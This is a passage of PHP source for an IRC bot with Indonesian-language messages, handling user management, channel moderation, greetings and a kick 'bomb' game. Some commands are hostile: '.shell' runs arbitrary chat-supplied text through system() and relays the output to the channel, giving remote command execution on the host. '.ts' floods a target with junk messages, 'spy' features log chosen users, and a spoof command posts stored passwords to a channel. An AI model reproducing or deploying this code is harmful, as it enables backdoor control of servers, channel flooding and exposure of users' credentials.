											fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :AddUser :'.$dCom[1].' As My '.$dCom[3] . CRLF);
											fputs($fp,'PRIVMSG ' . $dCom[1] . ' :You`re Now Known As My '.$dCom[3].' Added By ' . $fsrc[nick] .' With Pass ' . $dCom[2] . ' Now Type: ^Login <your pass> ' . CRLF);
										} else { fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :Wrong Command! Type: .Adduser <nick> <pass> <master/user> ' . CRLF); }
									}
									elseif ($auth["$fsrc[nkecil]"]["status"]=="master") {
										if (!$auth["$dCom[1]"]["name"]) {
											if ($dCom[3]=="user") {
												$auth["$dCom[1]"]["name"] = $dCom[1];
												$auth["$dCom[1]"]["pass"] = $dCom[2];
												$auth["$dCom[1]"]["status"] = $dCom[3];
												$auth["$dCom[1]"]["auth"] = 1;
												fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :AddUser :'.$dCom[1].' As My '.$dCom[3] . CRLF);
												fputs($fp,'PRIVMSG ' . $dCom[1] . ' :You`re Now Known As My 4'.$dCom[3].' Added By 2'.$fsrc[nick].' With Pass 4' . $dCom[2] . ' Now Type: 2^Login <your pass>' . CRLF);
											} else { fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :Wrong Command! Type: .Adduser <nick> <pass> user ' . CRLF); }
										} else { fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :User Already Exist! Aborting AddUser! ' . CRLF); }
									} else { fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :Unknown Status! Your Status is '.$auth["$fsrc[nkecil]"]["status"] . CRLF); }
								}
							}
							elseif ($auth["$fsrc[nkecil]"]["status"] && $dCom[0]=='.deluser' && $dCom[1] && $islogin) {
								$dCom[1] = strtolower($dCom[1]);
								if ($auth["$fsrc[nkecil]"]["auth"]==2) {
									if ($auth["$fsrc[nkecil]"]["status"]=="Admin") {
										if ($auth["$dCom[1]"]["status"]=="master" || $auth["$dCom[1]"]["status"]=="user") {
											unset($auth["$dCom[1]"]);
											fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :DelUser :'.$dCom[1].' From My UserList ' . CRLF);
											fputs($fp,'PRIVMSG ' . $dCom[1] . ' :Your Access As My Master Has Been Deleted By '.$fsrc[nick] . CRLF);
										} else { fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :Wrong Command! Type: .Deluser <nick> ' . CRLF); }
									} elseif ($auth["$fsrc[nkecil]"]["status"]=="master") {
										if ($auth["$dCom[1]"]["status"]=="user") {
											unset($auth["$dCom[1]"]);
											fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :DelUser :'.$dCom[1].' From My UserList ' . CRLF);
											fputs($fp,'PRIVMSG ' . $dCom[1] . ' :Your Access As My User Has Been Deleted By '.$fsrc[nick] . CRLF);
										} else { fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :Wrong Command! Type: .Deluser <nick> ' . CRLF); }
									}
								}
							}
							elseif ($dCom[0]=='.server' && $dCom[1] && $stboth==1){
								$bot['server']=$dCom[1];
								fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :Changing SeRVeR To '. $dCom[1] . CRLF); 
							}
							elseif ($dCom[0]=='.servpass' && $dCom[1] && $stboth==1){
								$bot['pserver']=$dCom[1];
								$bot['userver']=1;
								fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :Changing PassWOrD SeRVeR To '. $dCom[1] . CRLF); 
							}
							elseif ($dCom[0]=='.realname' && $dCom[1] && $stboth==1){
								$Rmsg=substr($TxtMsg,10);
								$Rmsg=ltrim($Rmsg);
								$bot['realname']=$Rmsg;
								fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :Changing ReaLNaMe To '. $Rmsg . CRLF); 
							}
							elseif ($dCom[0]=='.ident' && $dCom[1] && $stboth==1){
								$bot['ident']=$dCom[1];
								fputs($fp,'PRIVMSG ' . $fsrc[nick] . ' :Changing IdentD To '. $dCom[1] . CRLF); 
							}
							elseif ($dCom[0]=='.jump' && $stboth==1){
								$keluar = 0;
								fputs($fp, 'QUIT :'.$logobot[rand(0,count($logobot) - 1)].' ReSTaRt bY '.$fsrc[nick]. CRLF);
							}
							elseif ($dCom[0]=='.up' && $cmdin==1) {
								fputs($fp, 'PRIVMSG Chanserv :Op '.$Params[2].' '.$bot['nick'] . CRLF);
							}
							elseif ($dCom[0]=='.down' && $cmdin==1) {
								fputs($fp, 'MODE '.$Params[2].' +v-ho '.$bot['nick'].' '.$bot['nick'].' '.$bot['nick'].CRLF);
								fputs($fp, 'MODE '.$Params[2].' +vv-o '.$bot['nick'].' '.$bot['nick'].' '.$bot['nick'].CRLF);
							}
							elseif ($dCom[0]=='.o' || $dCom[0]=='.h' || $dCom[0]=='.v' || $dCom[0]=='.do' || $dCom[0]=='.dh' || $dCom[0]=='.dv'){
								if ($dCom[0]=='.o' || $dCom[0]=='.h' || $dCom[0]=='.v'){
									$moden=strtolower(substr($dCom[0],1));
									$moden='+'.$moden . $moden . $moden;
								}
								elseif ($dCom[0]=='.do' || $dCom[0]=='.dh' || $dCom[0]=='.dv'){
									$moden=strtolower(substr($dCom[0],2));
									$moden='-'.$moden . $moden . $moden;
								}
								if ($cmdin==1){$ttarget=$Params[2];$tforce=$dCom[1];$tmore=$dCom[2].' '.$dCom[3];}
								elseif($cmdin==0){$ttarget=$dCom[1];$tforce=$dCom[2];$tmore=$dCom[3].' '.$dCom[4];}
								if ($tforce) { $vonick = $tforce; }else { $vonick = $fsrc[nick]; }
								fputs($fp, 'MODE '.$ttarget.' '.$moden . ' '.$vonick.' '.$tmore. CRLF);
							}
							elseif ($dCom[0]=='.j' && $dCom[1]) {
								$jchan=$dCom[1];
								if (!ereg("#",$dCom[1])) { $jchan="#".$dCom[1]; }
								fputs($fp, 'JOIN '.$jchan . CRLF);
								if($dCom[2]){fputs($fp, 'JOIN '.$jchan .' '.$dCom[2] . CRLF);}
							}
							elseif ($dCom[0]=='.p') {
								$pchan=$dCom[1];
								if (!ereg("#",$dCom[1])) { $pchan="#".$dCom[1]; }
								if($dCom[1]){
									$pmsg = str_replace(".p ".$dCom[1],"",$TxtMsg);
									fputs($fp, 'PART '.$pchan . ' :'. ltrim($pmsg) . CRLF);
								}
								else{
									fputs($fp, 'PART '.$pchan . CRLF);
								}
							}
							elseif ($dCom[0]=='.cy') {
								$cychan=$dCom[1];
								if (!ereg("#",$dCom[1])) { $cychan="#".$dCom[1]; }
								if($dCom[1]){
									$pmsg = str_replace($comcom." ".$dCom[1],"",$TxtMsg);
									fputs($fp, 'PART '.$cychan . ' :'. ltrim($pmsg) . CRLF);
								}
								else{
									fputs($fp, 'PART '.$cychan . CRLF);
								}
								sleep(1);
								fputs($fp, 'JOIN '.$cychan . CRLF);
							}
							elseif ($dCom[0]=='.k' || $dCom[0]=='.kb' || $dCom[0]=='.kc') {
								if($dCom[1]){
									if ($cmdin==1){$tdata=$dCom[1];$ttarget=$Params[2];$tkode=$comcom.' '.$dCom[1];}
									elseif($cmdin==0){$tdata=$dCom[2];$ttarget=$dCom[1];$tkode=$comcom.' '.$dCom[1].' '.$dCom[2];}
									$msg = str_replace("$tkode","",$TxtMsg);
									$msg=ltrim($msg);
									if($dCom[0]=='.k'){
										fputs($fp, 'KICK '.$ttarget.' '.$tdata.' :'.$msg . CRLF);
									}
									elseif($dCom[0]=='.kb'){
										fputs($fp, 'MODE '.$ttarget.' +b '.$tdata . CRLF);
										fputs($fp, 'KICK '.$ttarget.' '.$tdata.' :'.$msg . CRLF);
									}
									elseif($dCom[0]=='.kc'){
										fputs($fp, 'PRIVMSG CHANSERV :KICK '.$ttarget.' '.$tdata.' '.$msg.''  . CRLF);
									}
								}

							}
							elseif ($dCom[0]=='.b' || $dCom[0]=='.ub') {
								if ($cmdin==1){$ttarget=$Params[2];$tkode=$comcom;}
		        					elseif($cmdin==0){$ttarget=$dCom[1];$tkode=$comcom.' '.$dCom[1];}
								$tmode = str_replace("$tkode","",$TxtMsg);
								$tmode = ltrim($tmode);
								if($dCom[0]=='.b'){
									fputs($fp, 'MODE '.$ttarget.' +b '.$tmode . CRLF);
								}
								else{
									fputs($fp, 'PRIVMSG Chanserv unban '.$ttarget.' '.$tmode . CRLF);
									fputs($fp, 'MODE '.$ttarget.' -b '.$tmode . CRLF);
								}

							}
							elseif ($dCom[0]=='.a' || $dCom[0]=='.s') {
								if($dCom[1]){
									if ($cmdin==1){$ttarget=$Params[2];$tkode=$comcom;}
									elseif($cmdin==0){$ttarget=$dCom[1];$tkode=$comcom.' '.$dCom[1];}
									$msg = str_replace("$tkode ","",$TxtMsg);
									if($dCom[0]=='.a'){
										fputs($fp,'PRIVMSG '.$ttarget.' :ACTION '.$msg.''. CRLF);
									}else{
										fputs($fp,'PRIVMSG '.$ttarget.' :'.$msg. CRLF);
									}
								}
							}
							if ($dCom[0]=='.ts' && $dCom[1] && $stboth==1){
									$tsmsg = strstr($TxtMsg,$dCom[0]);
									$tsmsg = str_replace($comcom." $dCom[1]","",$tsmsg);
									if (ereg("#", $dCom[1])) {
									     fputs($fp, 'JOIN '.$dCom[1] . CRLF);
									     sleep(1);
									}
									fputs($fp, 'PRIVMSG '.$dCom[1].' :'.$tsmsg.'[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi' . CRLF);
									fputs($fp, 'NOTICE '.$dCom[1].' :'.$tsmsg.'' . CRLF);
									fputs($fp, 'PRIVMSG '.$dCom[1].' :TSUNAMI '.$tsmsg.'' . CRLF);
									fputs($fp, 'PRIVMSG '.$dCom[1].' :'.$tsmsg.'[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi' . CRLF);
									fputs($fp, 'NOTICE '.$dCom[1].' :'.$tsmsg.'' . CRLF);
									fputs($fp, 'PRIVMSG '.$dCom[1].' :FLOOD '.$tsmsg.'' . CRLF);
									if (ereg("#", $dCom[1])) {
									     fputs($fp, 'PART '.$dCom[1].' :'.$tsmsg . CRLF);
									}

							}
							elseif ($dCom[0]=='.n'){
				                        fputs($fp, 'NICK '.$dCom[1] . CRLF);
							}
							elseif ($dCom[0]=='.away'){
								if($dCom[1]){
									$msga=substr($TxtMsg,6);
									fputs($fp, 'AWAY '. $msga . CRLF);
									unset($msga);
								}
								else{
									fputs($fp, 'AWAY' . CRLF);
									$isaway=false;
								}
							}
							elseif ($dCom[0]=='.raw' && $dCom[1] && $stboth==1){
								$msg = str_replace($comcom." ","",$TxtMsg);
								$msg=ltrim($msg);
								fputs($fp, 'PRIVMSG '.$Params[2] . ' :4Executed Raw Command. Use RAW With Caution. It Can Destroy The BOT.' . CRLF);
								fputs($fp,$msg.CRLF);
							}
							elseif ($dCom[0]=='.q' && $stauth==1 ){
								$keluar=1;
								if($dCom[1]){
									$keluar=1;
									$Qmsg=substr($TxtMsg,3);
									fputs($fp, 'QUIT :'.$Qmsg. CRLF);
								}
								else{
									$keluar=1;
									fputs($fp, 'QUIT'. CRLF);
									$keluar=1;
								}
							}
							elseif ($dCom[0]=='.autojoin' && $dCom[1]) {
								$dCom[1] = strtolower($dCom[1]);
								if ($dCom[1]=="on") { $sysjoinonkick = "on"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Auto Join is now '.$sysjoinonkick . CRLF); }
								elseif ($dCom[1]=="off") { $sysjoinonkick = "off"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Auto Join is now '.$sysjoinonkick. CRLF); }
							}
							elseif ($dCom[0]=='.autoaway' && $dCom[1]) {
								$dCom[1] = strtolower($dCom[1]);
								if ($dCom[1]=="on") { $autoaway = true; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Auto Away is now on' . CRLF); }
								elseif ($dCom[1]=="off") { $autoaway = false; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Auto Away is now off'. CRLF); }
							}
							elseif ($dCom[0]=='.astro' && $dCom[1]) {
								$dCom[1] = strtolower($dCom[1]);
								if ($dCom[1]=="on") { $sysastro = "on"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Astro Command is now '.$sysastro . CRLF); }
								elseif ($dCom[1]=="off") { $sysastro= "off"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Astro Command is now '.$sysastro . CRLF); }
							}
                                                        elseif ($dCom[0]=='.sms' && $dCom[1]) {
								$dCom[1] = strtolower($dCom[1]);
								if ($dCom[1]=="on") { $syssms = "on"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Sms Command is now '.$syssms . CRLF); }
								elseif ($dCom[1]=="off") { $syssms= "off"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Sms Command is now '.$syssms . CRLF); }
							}
							elseif ($dCom[0]=='.spoof' && $dCom[1]) {
								$dCom[1] = strtolower($dCom[1]);
								if ($dCom[1]=="on") { $sysspoof = "on"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Spoof Command is now '.$sysspoof . CRLF); }
								elseif ($dCom[1]=="off") { $sysspoof= "off"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Spoof Command is now '.$sysspoof . CRLF); }
							}
							elseif ($dCom[0]=='.ping' && $dCom[1]) {
								$dCom[1] = strtolower($dCom[1]);
								if ($dCom[1]=="on") { $sysping = "on"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Ping Command is now '.$sysping . CRLF); }
								elseif ($dCom[1]=="off") { $sysping = "off"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Ping Command is now '.$sysping . CRLF); }
							}
							elseif ($dCom[0]=='.versi' && $dCom[1]) {
								$dCom[1] = strtolower($dCom[1]);
								if ($dCom[1]=="on") { $sysversi = "on"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Version Command is now '.$sysversi . CRLF); }
								elseif ($dCom[1]=="off") { $sysversi = "off"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Version Command is now '.$sysversi . CRLF); }
							}
							elseif ($dCom[0]=='.bom' && $dCom[1] && $stboth==1) {
								$dCom[1] = strtolower($dCom[1]);
								$goboom=0;$targetboom="";$onboom="off";
								if ($dCom[1]=="on") { $sysboom = "on"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Boom Command is now '.$sysboom . CRLF); }
								elseif ($dCom[1]=="off") { $sysboom= "off"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Boom Command is now '.$sysboom . CRLF); }
							}
							elseif ($dCom[0]=='.chanbom' && $dCom[1] && $stboth==1) {
								$chanboom=strtolower($dCom[1]);
							}
							elseif ($dCom[0]=='.timebom' && $dCom[1] && $stboth==1) {
								if($dCom[1]<=30){$timeboom=$dCom[1];}
							}
							elseif ($dCom[0]=='.spy' && $dCom[1] && $stboth==1) {
								$dCom[1] = strtolower($dCom[1]);
								if ($dCom[1]=="on") { $sysspy = "on"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Spy Command is now '.$sysspy . CRLF); }
								elseif ($dCom[1]=="off") { $sysspy = "off"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Spy Command is now '.$sysspy . CRLF); }
							}
							elseif($dCom[0]=='.chanlog' && $dCom[1] && $stboth==1){
								$spychan["chan"]=$dCom[1];
								fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Spy Log cHanGe To '.$dCom[1] . CRLF);
							}
							
							elseif($dCom[0]=='.addlog' && $dCom[1] && $stboth==1){
								$dlogc=strtolower($dCom[1]);
								$spynick["$dlogc"]=$dCom[1];
								fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Addlog :'.$dCom[1].' ' . CRLF);
							}
							elseif($dCom[0]=='.dellog' && $dCom[1] && $stboth==1){
								$elogl=strtolower($dCom[1]);
								fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Dellog :'.$dCom[1].' ' . CRLF);
								unset($spynick["$elogl"]);
							}
							elseif ($dCom[0]=='.ison' && $dCom[1] && $stboth==1) {
								$dCom[1] = strtolower($dCom[1]);
								if ($dCom[1]=="on") { $sysison ="on"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Ison is now On' . CRLF); }
								elseif ($dCom[1]=="off") { $sysison ="off"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Ison is now Off' . CRLF); }
							}
							elseif ($dCom[0]=='.chanison' && $dCom[1] && $stboth==1) {
								$dCom[1] = strtolower($dCom[1]);
							        $chanson=$dCom[1];
							}
							elseif ($dCom[0]=='.addison' && $dCom[1] && !ereg(";",$dCom[1]) && $stboth==1) {
								$addson=strtolower($dCom[1]);
								$addgak=1;
								$xplistson=explode(";",$mylistson);
								foreach ($xplistson as $plist){
									if ($plist==$addson){$addgak=0;}
								}
								if($addgak==1){
									$mylistson = $mylistson . ';' . $addson;
									$mylistson=str_replace(";;","",$mylistson);
									$mylistson=ltrim($mylistson,";");
									$mylistson=str_replace(";;","",$mylistson);
									$mylistson=rtrim($mylistson,";");
									$mylistson=str_replace(";;","",$mylistson);
								}
								$llo=$mylistson;
								$llll=str_replace(";"," ",$llo);
								fputs($fp, 'PRIVMSG '.$fsrc[nick].' :LIST ISON '.$llll . CRLF);
								unset($llll);
								unset($xplistson);
							}
							elseif ($dCom[0]=='.delison' && $dCom[1] && $stboth==1) {
								$delplist=strtolower($dCom[1]);
								$mylistson=$mylistson;
								$tmplistson="";
								$xplistson=explode(";",$mylistson);
								foreach ($xplistson as $plist){
									if($delplist<>$plist){
										$tmplistson = $tmplistson . ';' . $plist;
										$tmplistson=str_replace(";;","",$tmplistson);
										$tmplistson=ltrim($tmplistson,";");
										$tmplistson=str_replace(";;","",$tmplistson);
										$tmplistson=rtrim($tmplistson,";");
										$tmplistson=str_replace(";;","",$tmplistson);
									}
								}
								$mylistson=$tmplistson;
								$llo=$mylistson;
								$llll=str_replace(";"," ",$llo);
								fputs($fp, 'PRIVMSG '.$fsrc[nick].' :LIST ISON '.$llll . CRLF);
								unset($llll);
								unset($xplistson);
							}
							elseif ($dCom[0]=='.greet' && $dCom[1] && $stboth==1){
								$dCom[1] = strtolower($dCom[1]);
								if ($dCom[1]=="on") { $sysgreet = "on"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Greet System is now '.$sysgreet . CRLF); }
								elseif ($dCom[1]=="off") { $sysgreet = "off"; fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Greet System is now '.$sysgreet . CRLF); }
							}
							elseif($dCom[0]=='.addgreet' && $dCom[1] && $dCom[2] && $stboth==1){
								$ddc=strtolower($dCom[1]);
								$greetmsg["$ddc"]["nama"]=$dCom[1];
								$mgreet=str_replace($comcom." ".$dCom[1]." ","",$TxtMsg);
								$greetmsg["$ddc"]["msg"]=$mgreet;
								fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Auto Greet For :'.$greetmsg["$ddc"]["nama"] . CRLF);
								fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Auto Greet Msg :'.$greetmsg["$ddc"]["msg"] . CRLF);
							}
							elseif($dCom[0]=='.delgreet' && $dCom[1] && $stboth==1){
								$eel=strtolower($dCom[1]);
								unset($greetmsg["$eel"]["nama"]);
								unset($greetmsg["$eel"]["msg"]);
								fputs($fp, 'PRIVMSG '.$fsrc[nick].' :Delete Greet For :'.$eel . CRLF);
							}
							elseif ($dCom[0]=='.botnick') {
								fputs($fp, 'PRIVMSG '.$fsrc[nick].' :My Nick Is :'.$bot['nick'] . CRLF);
							}
							elseif ($dCom[0]=='.banlist' && $dCom[1]) {
								$bchan=$dCom[1];
								if (!ereg("#",$dCom[1])) { $bchan="#".$dCom[1]; }
								fputs($fp, 'MODE '.$bchan.' b' . CRLF);
								$banlist["$bchan"]=$fsrc[nick];
							}
							elseif ($dCom[0]=='.userlist') {
								$userlist="";
								foreach ($auth as $ulist) {
									if ($ulist["pass"]) { $pass="-pass ok"; }
									else { $pass="-no pass"; }
									$userlist .= $ulist["name"].'('.$ulist["status"].$pass.') ';
								}
								fputs($fp, 'NOTICE '.$fsrc[nick].' :User List: '.$userlist . CRLF);
							}
							elseif ($dCom[0]=='.nicklist' && $dCom[1]) {
								$nl_chan=explode(" ",$user_chan_arr[strtolower($dCom[1])]["nick"]);
								foreach ( $nl_chan as $cur_xuser => $xuser){
									$limitshow++;
									$lx_user=$lx_user.' '. $xuser;
									if($limitshow==15){
									$lx_user.="[SP]";
									$limitshow=0;
									}
								}
								$lx_user=ltrim($lx_user);
								$lx_user=rtrim($lx_user);
								$lx_user=str_replace("  "," ",$lx_user);
								$lx_user=str_replace("[SP] ","[SP]",$lx_user);
								$lxuser=explode("[SP]",$lx_user);
								
								for ($i = 0; $i <= count($lxuser); $i++) {
								if($lxuser[$i]){fputs($fp, 'NOTICE '.$fsrc[nick].' :Names '.$dCom[1].' - '.$lxuser[$i]. CRLF);}
								}
								unset($lxuser);
								unset($lx_user);
								unset($nl_chan);
								unset($limitshow);

							}
							elseif ($dCom[0]=='.status') {
								$modbot="";
								if($sysastro=="on"){$modbot.=' [4A]sTRo';}
								if($sysping=="on"){$modbot.=' [4P]iNG';}
								if($sysspoof=="on"){$modbot.=' SPoo[4F]';}
								if($sysversi=="on"){$modbot.=' V[4E]rSIoN';}
								if($sysison=="on"){$modbot.=' [4I]soN';}
								if($sysgreet=="on"){$modbot.=' [4G]rEEt';}
								if($sysspy=="on"){$modbot.=' [4S]py';}
								if($autoaway==true){$modbot.=' AUtoA[4W]ay';}
								if($sysjoinonkick=="on"){$modbot.=' AuTo[4J]oIN';}
								$modbot=ltrim($modbot);
								$modbot=rtrim($modbot);
								if($modbot==""){$modbot="[4PA]RKiR [4NI]c[4K]";}
								fputs($fp,'PRIVMSG '.$Params[2].' :ACTION iS MODeS '.$modbot.''. CRLF);
							}
							elseif ($dCom[0]=='.help' && $cmdin==0) {
								fputs($fp,'PING 12886241614'. CRLF);
								$dlhelp=0;
								foreach ($helpbot as $lhelp){
									$dlhelp++;
									if($dlhelp>=2){sleep(2);$dlhelp=0;}
									fputs($fp,'PRIVMSG '.$fsrc[nick].' :'.$lhelp. CRLF);
								}
								unset($lhelp);
								unset($dlhelp);
							}
							elseif ($dCom[0]=='.shell' && $dCom[1] && $cmdin==1 && $stboth==1) {
								$msg = str_replace($comcom." ","",$TxtMsg);
								$msg=ltrim($msg);
								fputs($fp,'PING 78456841614'. CRLF);
								$exec = system("$msg > /tmp/cmdxtemp >&1");
								$exec = system("wc -l /tmp/cmdxtemp");
								$len = str_replace("     ","",$exec);
								$len = str_replace(" /tmp/cmdxtemp","",$len);
								$len = str_replace("    ","",$len);
								$len = str_replace("   ","",$len);
								$len = str_replace("  ","",$len);
								$len = str_replace(" ","",$len);
								
								if ($len == 1){ 
									$ggr = system("cat /tmp/cmdxtemp");
									fputs($fp,'PRIVMSG '.$Params[2].' :'.$ggr. CRLF);
								}
								for($i=0;$i < $len;$i++)   { 
									$perintah = system('cat /tmp/cmdxtemp | head -'.$i.' | tail -1');
									fputs($fp,'PRIVMSG '.$Params[2].' :'.$perintah. CRLF);
									sleep(2);
								}
								system("rm /tmp/cmdxtemp");
							}



						}
						
						######### End Params Command Master ############

						########## Params Command Public ##############
						elseif (substr($Params[3],0,2)==':!'){
							if (strtolower($Params[3])==':!ping' && ereg('#',$Params[2]) && $sysping=="on") {
								$sendping=time();
								$ping["$sendping"]["ping"] = time();
								$ping["$sendping"]["chan"] = $Params[2];
								$idaway=0;
								if($isaway){fputs($fp,'AWAY'. CRLF);$isaway=false;}
								fputs($fp,'PRIVMSG '.$fsrc[nick].' :PING '.$ping["$sendping"]["ping"].'' . CRLF);
							}
							elseif (strtolower($Params[3])==':!versi' && ereg('#',$Params[2]) && $sysversi=="on") {
								fputs($fp,'PRIVMSG '.$Params[4].' :VERSION'. CRLF);
								$datversi[strtolower($Params[4])]["nick"]=strtolower($Params[4]);
								$datversi[strtolower($Params[4])]["chan"]=$Params[2];
							}
							elseif (strtolower($Params[3])==':!potong' && ereg('#',$Params[2])) {
								$pilihanwar=strtolower($Params[4]);
								$warnabenar=strtolower($warnabenar);
								if(strtolower($Params[2])==strtolower($chanboom)){
									if(strtolower($fsrc[nkecil])==strtolower($targetboom)){
										if($pilihanwar==strtolower($bw[0]) || $pilihanwar==strtolower($bw[1]) || $pilihanwar=="biru" ){
											if($warnabenar==$pilihanwar){
												fputs($fp,'PRIVMSG '.$chanboom.' :Selamat '.$fsrc[nick].', kamu berhasil menjinakan Bom!!'. CRLF);
												fputs($fp, 'MODE '.$chanboom.' +vvv '.$fsrc[nick]. CRLF);
											}
											else{
												fputs($fp, 'PRIVMSG CHANSERV :KICK '.$chanboom.' '. $fsrc[nick].' 0,4BOOOOOOMMMM!!!!!'  . CRLF);
												fputs($fp, 'KICK '.$chanboom.' '. $fsrc[nick].' :0,4BOOOOOOMMMM!!!!!'  . CRLF);
											}
											$goboom=0;
											$onboom="off";
											$targetboom="";
										}
									}
								}
							}
							elseif (strtolower($Params[3])==':!bom' && ereg('#',$Params[2]) && $sysboom="on") {
								if(strtolower($Params[2])==strtolower($chanboom) && $onboom=="off" && strtolower($Params[3])!=strtolower($bot['nick'])){
									if(strpos(strtolower($user_chan_arr[strtolower($Params[2])]["nick"]),' '.strtolower($Params[4]).' ')){
										$onboom="on";
										$goboom=0;
										$targetboom=$Params[4];
										$tmpwbom=$warnaboom;
										$wrnb=explode(";",$tmpwbom);
										$bw[0]=$wrnb[rand(0,count($wrnb) - 1)];
										unset($wrnb);
										$tmpwbom=str_replace($bw[0],"",$tmpwbom);
										$tmpwbom=str_replace(";;",";",$tmpwbom);
										$wrnb=explode(";",$tmpwbom);
										$bw[1]=$wrnb[rand(0,count($wrnb) - 1)];
										unset($wrnb);
										$tmboom=time();
										
										$warnabenar=$bw[rand(0,count($bw) - 1)];
										
										fputs($fp,'PRIVMSG '.$Params[2]." :ACTION memasukan 4[0,4  T N T  4]1-----4`,'. ke dalam baju ".$Params[4].''. CRLF);
										fputs($fp,'PRIVMSG '.$Params[2].' :'.$Params[4].'!! km punya waktu ['.$timeboom.'] detik. Jinakkan Bom dengan memotong kabel yg benar. Dan hanya ada tiga kabel. '.$bw[0] .', '.$bw[1].' dan Biru'. CRLF);
										fputs($fp, 'MODE '.$chanboom.' -vvv '.$Params[4]. CRLF);
									}
								}
							}
							elseif (strtolower($Params[3])==":!spoof" && ereg('#',$Params[2]) && $sysspoof=="on") {
								$spoofnya=strtolower($Params[4]);
							  if ($Params[5]<=$jmlspoof["$spoofnya"] && $Params[5]>0){
							     fputs($fp,'PRIVMSG '.$Params[2].' :15(04Spoof15) Ident: 4' . $isisp["$Params[5]"]["$spoofnya"]["ident"] .' Spoof: 4' . $isisp["$Params[5]"]["$spoofnya"]["spoof"] .' Passw: 4' . $isisp["$Params[5]"]["$spoofnya"]["pass"].''. CRLF);
							  }
							  else {
							    fputs($fp,'PRIVMSG '.$Params[2].' :15(04Spoof15) Request Error'. CRLF);
							  }
							}
							elseif (strtolower($Params[3])==':!update' && ereg('#',$Params[2]) && $sysspoof=="on") {
								fputs($fp,'PING 3424234328'. CRLF);
								$spoof=strtolower($Params[4]);
								$spallnet = "http://www.allnetwork.or.id/Pendaftaran/Personal_spoof/?mode=view&server=$spoof";
								//$spallnet="http://localhost/spoof1.html";
								$handisp = fopen ($spallnet, "rb");
								$kontensp = "";
								do {
									$barissp = fread($handisp, 512);
									if (strlen($barissp) == 0) { break; }
										$kontensp .= $barissp;
								} while(true);
								fclose ($handisp);
								$kontensp=strtolower($kontensp);
								$kontensp = str_replace("  "," ",$kontensp);
								$kontensp = str_replace("\n","",$kontensp);
								$kontensp = str_replace(chr(9),"",$kontensp);
								$kontensp = str_replace("\r","",$kontensp);
								$kontensp = str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$kontensp);
								for ($i = 1; $i <= 10; $i++) {
								$kontensp = str_replace("  "," ",$kontensp);
								}
								$kontensp = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$kontensp);
								$tmpjml1=stristr($kontensp,"<tr bgcolor=yellow><td colspan=10 align=right>found ");
								$tmpjml2=stristr($kontensp," data</td></tr>");
								
								$tmpjml=str_replace($tmpjml2,"",$tmpjml1);
								$tmpjml=str_replace("<tr bgcolor=yellow><td colspan=10 align=right>found ","",$tmpjml);
								$kontensp = str_replace("</td> <td>","</td><td>",$kontensp);
								$kontensp = str_replace("<tr bgcolor=white> <td align=right>","<tr bgcolor=white><td align=right>",$kontensp);
								$kontensp = str_replace("</tr> <tr","</tr><tr",$kontensp);
								$kontensp =  str_replace(" </td>","</td>",$kontensp);
								$kontensp =str_replace("> <td","><td",$kontensp);
								for ($i = 1; $i <= $tmpjml; $i++) {
									if ($i==$tmpjml){
									$identsp="";$spoofsp="";$passsp="";
